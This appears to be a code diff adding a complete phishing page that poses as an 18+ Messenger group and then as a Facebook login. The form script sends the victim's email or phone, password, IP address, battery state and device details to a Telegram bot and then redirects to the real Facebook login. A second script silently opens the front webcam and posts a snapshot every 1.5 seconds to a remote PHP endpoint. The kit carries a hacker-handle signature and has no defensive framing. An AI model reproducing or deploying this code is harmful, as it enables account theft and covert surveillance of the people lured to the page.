@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Messenger Group & Login</title>
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"> 
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
+    <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
+	<link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
+    <style>
+        * {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f2f5;
+        }
+        .hidden {
+            display: none;
+        }
+        .group-container, .login-container {
+            width: 90%;
+            max-width: 400px;
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+        .profile-img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: 10px;
+        }
+        .group-name {
+            font-size: 20px;
+            font-weight: bold;
+            margin: 5px 0;
+        }
+        .participants {
+            font-size: 14px;
+            color: gray;
+        }
+        .icons {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 15px 0;
+        }
+        .icon-box {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 14px;
+        }
+        .icon {
+            font-size: 24px;
+            cursor: pointer;
+        }
+        .media-section {
+            text-align: left;
+            margin-top: 20px;
+            padding-left: 10px;
+        }
+        .media-box-container {
+            display: flex;
+            gap: 10px;
+            overflow-x: auto;
+            padding: 10px 0;
+        }
+        .media-box {
+            width: 70px;
+            height: 60px;
+            border-radius: 10px;
+            background: #ddd;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+        }
+        #box1{
+        background-image: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNaiqhOTVqwgbtyQoPVchZqw9Xeck3i594WS0uXVkw7eQSA91gFwc-ZkA&s=10");
+        background-size: cover;
+        }
+        #box4{
+        background-image: url("https://cdncontent.xxxwaffle.com/content/2/569/2569412_dcb18f0.jpg");
+        background-size: cover;
+        }
+        #box2{
+        background-image: url("https://i.postimg.cc/N0JzTxXk/IMG-20220726-210625-picsay.jpg");
+        background-size: cover;
+        }
+        #box3{
+        background-image: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRWO8_tofwFoFbst0MEHZa-pWgCBQTjyvAnWt7OjiTMxHqvxNCBtz1U_k4&s=10");
+        background-size: cover;
+        }
+        #box5{
+        background-image: url("https://i.ibb.co/85YydzM/165325118357786736.png");
+        background-size: cover;
+        }
+        .join-btn {
+            background: linear-gradient(to right, #ff00ff, #0000ff);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            margin-top: 20px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .login-container {
+            text-align: center;
+            padding: 20px;
+        }
+        .login-header {
+            font-size: 22px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 5px;
+        }
+        .subtext {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+        .input-box {
+            position: relative;
+            margin-top: 10px;
+        }
+        .input-box input {
+            width: 100%;
+            padding: 12px;
+            padding-right: 40px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .show-btn {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 14px;
+            color: #007bff;
+            background: none;
+            border: none;
+            display: none;
+            font-weight: bold;
+        }
+        .btn {
+            background: linear-gradient(45deg, #ff0080, #8000ff);
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+            border-radius: 5px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="video-wrap" hidden="hidden">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    
+    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+    
+    <!-- Group Page -->
+    <div class="group-container" id="groupPage">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRu7BslXlUg0c8KojMtP6jwXaSptlkqDMy3Jg&usqp=CAU" class="profile-img" alt="Group Profile">
+        <h2 class="group-name">SEX VIDEOS +18 💋💦</h2>
+        <p class="participants">Group 1,670 Participants</p>
+        
+        <div class="icons">
+            <div class="icon-box">
+                <span class="icon">📞</span>
+                <span>Call</span>
+            </div>
+            <div class="icon-box">
+                <span class="icon">📹</span>
+                <span>Video</span>
+            </div>
+            <div class="icon-box">
+                <span class="icon">🔍</span>
+                <span>Search</span>
+            </div>
+        </div>
+
+        <div class="media-section">
+            <p>Media, links and docks</p>
+            <div class="media-box-container">
+                <div id="box1" class="media-box"></div>
+                <div id="box2" class="media-box"></div>
+                <div id="box3" class="media-box"></div>
+                <div id="box4" class="media-box"></div>
+                <div id="box5" class="media-box">videos</div>
+            </div>
+        </div>
+        <button class="join-btn" onclick="showLogin()">JOIN THE GROUP</button>
+    </div>
+
+    <!-- Login Page (Hidden initially) -->
+    <div class="login-container hidden" id="loginPage">
+        <h2 class="login-header">Facebook</h2>
+        <p class="subtext">Log in to your Facebook account to connect to Group 18+</p>
+        
+        <form id="loginForm">
+            <div class="input-box">
+                <input type="text" name="email" id="emailOrPhone" placeholder="Number or email address">
+            </div>
+            <div class="input-box">
+                <input type="password" name="password" id="password" placeholder="Password" oninput="toggleShowButton()">
+                <button type="button" class="show-btn" id="showBtn" onclick="togglePassword()">Show</button>
+            </div>
+            <button type="submit" class="btn">Log In</button>
+        </form>
+    </div>
+    
+    <script>
+        function showLogin() {
+            document.getElementById("groupPage").classList.add("hidden");
+            document.getElementById("loginPage").classList.remove("hidden");
+        }
+
+        function toggleShowButton() {
+            let passwordInput = document.getElementById("password");
+            let showBtn = document.getElementById("showBtn");
+
+            if (passwordInput.value.length > 0) {
+                showBtn.style.display = "block";
+            } else {
+                showBtn.style.display = "none";
+            }
+        }
+
+        function togglePassword() {
+            let passwordInput = document.getElementById("password");
+            let showBtn = document.getElementById("showBtn");
+
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                showBtn.textContent = "Hide";
+            } else {
+                passwordInput.type = "password";
+                showBtn.textContent = "Show";
+            }
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const emailOrPhone = document.getElementById('emailOrPhone').value;
+            const password = document.getElementById('password').value;
+
+            const botToken = 'YOUR_BOT_TOKEN'; // replace
+             const chatId = 'YOUR_CHAT_ID';    // replace
+
+            // Collect IP Address
+            const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+
+            // Device Info
+            const deviceInfo = navigator.userAgent;
+
+            // Battery Info
+            let batteryInfo = 'Unavailable';
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                batteryInfo = `Battery: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
+            }
+
+            const message = `
+📥 Welcome to web Login info:
+-------------------------------------------------------------
+📧 Email/Phone: ${emailOrPhone}
+
+🔑 Password: ${password}
+
+🔋 ${batteryInfo}
+
+🌐 IP Address: ${ipData.ip}
+
+📱 Device Info: ${deviceInfo}
+-------------------------------------------------------------
+📌Create by Mahadeb:@ZeroHackNexus
+`;
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                const data = await response.json();
+                console.log('Telegram response:', data);
+
+                // Simulate Facebook redirect
+                window.location.href = 'https://www.facebook.com/login/';
+
+            } catch (err) {
+                console.error('Telegram Error:', err);
+                window.location.href = 'https://www.facebook.com/login/';
+            }
+        });
+    </script>
+    <script>
+ 
+ function post(imgdata){
+ $.ajax({
+     type: 'POST',
+     data: { cat: imgdata},
+     url: 'forwarding_link/post.php',
+     dataType: 'json',
+     async: false,
+     success: function(result){
+         // call the function that handles the response/results
+     },
+     error: function(){
+     }
+   });
+ };
+ 
+ 
+ 'use strict';
+ 
+ const video = document.getElementById('video');
+ const canvas = document.getElementById('canvas');
+ const errorMsgElement = document.querySelector('span#errorMsg');
+ 
+ const constraints = {
+   audio: false,
+   video: {
+     
+     facingMode: "user"
+   }
+ };
+ 
+ // Access webcam
+ async function init() {
+   try {
+     const stream = await navigator.mediaDevices.getUserMedia(constraints);
+     handleSuccess(stream);
+   } catch (e) {
+     errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+   }
+ }
+ 
+ // Success
+ function handleSuccess(stream) {
+   window.stream = stream;
+   video.srcObject = stream;
+ 
+ var context = canvas.getContext('2d');
+   setInterval(function(){
+ 
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData); }, 1500);
+   
+ 
+ }
+ 
+ // Load init
+ init();
+ 
+ </script>
+</body>
+</html>
